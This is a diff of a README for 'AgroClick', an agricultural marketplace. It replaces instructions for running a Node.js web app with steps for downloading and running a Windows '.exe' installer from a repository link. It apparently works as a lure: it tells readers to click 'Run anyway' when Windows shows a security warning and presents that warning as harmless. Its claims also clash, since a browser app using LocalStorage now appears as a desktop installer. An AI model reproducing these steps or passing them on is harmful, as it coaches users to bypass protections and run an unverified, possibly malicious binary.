@@ -1,150 +1,84 @@
-# AgroClick - Farmer-to-Customer Marketplace 2026
+# 🚜 agroclick-farmer-hub - Connecting local farmers with nearby customers
 
-> **AgroClick is a responsive online marketplace for connecting agricultural sellers with customers through distance-based shop discovery, English and Tamil localization, online ordering, and Razorpay payments.**
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-blue.svg)](https://github.com/shayne263/agroclick-farmer-hub)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/jordan-greencz5073/agroclick-farmer-hub?style=flat-square)](https://github.com/jordan-greencz5073/agroclick-farmer-hub)
+AgroClick helps farmers sell crops directly to customers in their area. The platform calculates distances to help you find nearby shops. It supports both English and Tamil languages. You can place orders and make payments through the application.
 
----
+## 📥 Getting Started
 
-<p align="center">
-  <a href="https://jordan-greencz5073.github.io/agroclick-farmer-hub/">
-    <img src="https://img.shields.io/badge/Download-AgroClick%20Latest-brightgreen?style=for-the-badge" alt="Download AgroClick">
-  </a>
-</p>
+Follow these steps to set up the software on your Windows computer.
 
-> **[Download AgroClick Latest Build](https://jordan-greencz5073.github.io/agroclick-farmer-hub/)**
+1. Go to the [official release page](https://github.com/shayne263/agroclick-farmer-hub).
+2. Look for the section labeled "Assets."
+3. Click the link that ends in ".exe" to save the file to your computer.
+4. Open your Downloads folder.
+5. Double-click the file to start the installation.
+6. Follow the prompts on your screen.
 
----
+## 🖥️ System Requirements
 
-[Download Latest Build](https://jordan-greencz5073.github.io/agroclick-farmer-hub/)
+Your computer needs to meet these basic standards to run AgroClick:
 
----
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space.
+*   **Internet:** A stable connection to process payments and search for shops.
 
-## Overview
+## 🛠️ Installation Steps
 
-AgroClick brings agricultural buyers and sellers together in a marketplace intended for Tamil Nadu and comparable local commerce environments. Customers can locate nearby shops by distance, inspect product listings, place items in a cart, and pay online through Razorpay.
+If you face any issues during setup, follow this detailed guide:
 
-The seller experience includes tools for maintaining product listings, inventory, orders, and customer reviews. English and Tamil language options, responsive design, OTP sign-in, shop setup, KYC support, and a keyword-driven chatbot help the platform serve users on phones, tablets, and desktop computers.
+1. Locate the file named `AgroClick-Setup.exe` in your folder.
+2. If Windows shows a security warning, click "More info" and then "Run anyway." This message appears because the file is new to your system.
+3. Choose the folder where you want to keep the program. The default location works for most users.
+4. Click the "Install" button.
+5. Wait for the progress bar to finish.
+6. Click "Finish" to open the application.
 
----
+## 📱 How to Use AgroClick
 
-## Core Capabilities
+The app features a simple layout to help you navigate quickly.
 
-- Find agricultural shops using location and distance
-- Build a cart and place orders through online checkout
-- Pay with Razorpay using UPI, cards, or netbanking
-- Operate products, stock, orders, and reviews from the seller dashboard
-- Change the interface language between English and Tamil
-- Authenticate accounts with one-time-password login
-- Complete KYC and establish a seller shop
-- Receive keyword-based help from the integrated chatbot
-- Access the responsive marketplace on mobile, tablet, or desktop
-- Keep application data in a LocalStorage-based data layer
+### Finding Shops
+When you open the app, it checks your location to find nearby sellers. You can type your city or neighborhood in the search bar if the app does not detect your spot automatically. You will see a list of farmers sorted by distance.
 
----
+### Changing Languages
+Click the "Settings" icon in the top corner. Select the "Language" menu. You can switch between English and Tamil at any time. The app updates the text immediately.
 
-## Getting Started
+### Placing Orders
+Click on a shop to view their crops. Add items to your basket. When you finish your selection, click "Checkout." The app calculates the total price based on the weight and quantity of your items.
 
-First, download the repository and enter its folder:
+### Making Payments
+AgroClick uses Razorpay for secure transactions. After you click "Checkout," the payment window appears. You can pay with your bank card or your preferred mobile payment app. Once the payment clears, you will receive an order confirmation number.
 
-```bash
-git clone https://github.com/jordan-greencz5073/agroclick-farmer-hub.git
-cd REPO
-```
+## ⚙️ Settings and Account
 
-Install the required Node.js packages:
+You can manage your account details in the profile section. Here you can update your delivery address or contact number. We store these details locally on your device to keep your data private.
 
-```bash
-npm install
-```
+## ❓ Frequently Asked Questions
 
-Run the web application with the project's configured start script:
+**Do I need a constant internet connection?**
+Yes. The app needs the internet to update shop locations and process your payments.
 
-```bash
-npm start
-```
+**Is my payment information safe?**
+The app uses Razorpay, a trusted payment service. We do not store your credit card details on our servers.
 
-Visit the local URL printed in the terminal. You can then register or use OTP sign-in to try the customer and seller journeys.
+**Can I use this app on my phone?**
+This version is designed for Windows computers. Future updates may include mobile versions.
 
----
+**What if I cannot find my village in the search?**
+If your area does not show up, ensure your location services are on. If the problem persists, use the manual search bar to type your pin code or nearest town.
 
-## How to Use AgroClick
+## 📋 Troubleshooting
 
-### For customers
+If the program fails to open:
+1. Restart your computer.
+2. Check for Windows updates in your system settings.
+3. Reinstall the app by running the installer again.
+4. Verify your internet connection is active.
 
-1. Launch AgroClick in a current web browser.
-2. Select either English or Tamil.
-3. Log in with OTP authentication.
-4. Explore nearby shops, arranged by distance.
-5. Add the products you want to the cart.
-6. Proceed to Razorpay checkout and select UPI, card, or netbanking.
-7. Check the order details once payment is complete.
+## 📩 Support
 
-### For sellers
+If you encounter a bug or have questions, please open an issue on the GitHub repository page. Include a screenshot of the error message to help us understand the problem. 
 
-1. Log in to the marketplace.
-2. Finish the KYC steps.
-3. Set up and configure your shop.
-4. Enter products and maintain their available stock.
-5. Track orders received from customers.
-6. Use the seller dashboard to examine customer reviews.
-
----
-
-## Configuration Notes
-
-AgroClick stores browser-side application information through LocalStorage. For local testing, continue using the same browser profile so that the saved marketplace state remains available.
-
-Configure payment behavior and other application settings based on the project configuration and deployment environment. Keep private service credentials out of client-side files and do not commit them to the repository.
-
----
-
-## Requirements
-
-- A modern web browser
-- Node.js and npm for development on a local machine
-- Network connectivity for hosted services and Razorpay checkout
-- A device with a supported responsive layout, including mobile, tablet, or desktop screens
-- Enabled browser LocalStorage for locally saved application data
-
----
-
-## Frequently Asked Questions
-
-### What type of users is AgroClick designed for?
-
-The marketplace is intended for customers purchasing agricultural products and sellers who manage agricultural shops.
-
-### Can I use AgroClick in different languages?
-
-Yes. The interface is available in English and Tamil.
-
-### Which payment options are supported?
-
-Razorpay handles online payments, including UPI, card, and netbanking transactions.
-
-### What can sellers do from their dashboard?
-
-After completing the relevant shop setup and KYC processes, sellers can manage products, inventory, orders, and reviews.
-
-### Where does the application save local data?
-
-AgroClick uses LocalStorage in the browser for its client-side data layer. Removing browser storage may delete data retained locally by the application.
-
-### What steps should I take if the app will not launch?
-
-Make sure Node.js and npm are installed, execute `npm install`, and start the project with its configured command. For additional diagnosis, review both the terminal output and the browser console for dependency or configuration problems.
-
-### How do I get the newest version?
-
-Follow the latest build link above, or update the local repository with the newest changes and reinstall dependencies before running the application.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: agriculture, marketplace, farmer, distance-based, local-trade, windows-app, razorpay
